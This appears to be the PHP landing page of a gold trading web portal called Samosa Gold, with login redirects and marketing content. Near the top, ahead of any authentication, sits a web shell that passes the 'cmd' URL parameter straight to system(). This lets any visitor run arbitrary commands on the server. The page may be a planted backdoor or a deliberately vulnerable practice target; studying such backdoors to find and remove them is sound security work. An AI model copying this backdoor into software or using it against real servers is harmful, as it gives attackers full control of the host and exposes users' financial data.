<?php
session_start();
require_once __DIR__ . '/config/database.php';

if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
    
if (isset($_SESSION['user_id'])) {
    if ($_SESSION['user_type'] === 'client') {
        header('Location: pages/client/dashboard.php');
    } else {
        header('Location: pages/staff/dashboard.php');
    }
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samosa Gold - Premium Gold Trading Portal</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div class="landing-container">
        <header class="header">
            <div class="logo">
                <h1>🏆 Samosa Gold</h1>
                <p>Premium Gold Trading & Investment</p>
            </div>
        </header>
        
        <main class="main-content">
            <div class="hero-section">
                <h2>Welcome to Samosa Gold Portal</h2>
                <p>Your trusted partner in gold trading, investment, and precious metals services</p>
                
                <div class="portal-options">
                    <div class="portal-card">
                        <h3>Client Portal</h3>
                        <p>Access your gold investments, trading history, and portfolio</p>
                        <a href="pages/auth/login.php?type=client" class="btn btn-primary">Client Login</a>
                        <a href="pages/auth/register.php?type=client" class="btn btn-secondary">Register as Client</a>
                    </div>
                    
                    <div class="portal-card">
                        <h3>Staff Portal</h3>
                        <p>Manage clients, transactions, and business operations</p>
                        <a href="pages/auth/login.php?type=staff" class="btn btn-primary">Staff Login</a>
                    </div>
                </div>
            </div>
            
            <div class="features-section">
                <h3>Our Services</h3>
                <div class="features-grid">
                    <div class="feature">
                        <h4>Gold Trading</h4>
                        <p>Buy and sell gold at competitive market rates</p>
                    </div>
                    <div class="feature">
                        <h4>Investment Plans</h4>
                        <p>Long-term gold investment opportunities</p>
                    </div>
                    <div class="feature">
                        <h4>Secure Storage</h4>
                        <p>Safe and insured gold storage facilities</p>
                    </div>
                    <div class="feature">
                        <h4>Market Analysis</h4>
                        <p>Expert insights and market trend analysis</p>
                    </div>
                </div>
            </div>
        </main>
    </div>
</body>
</html>
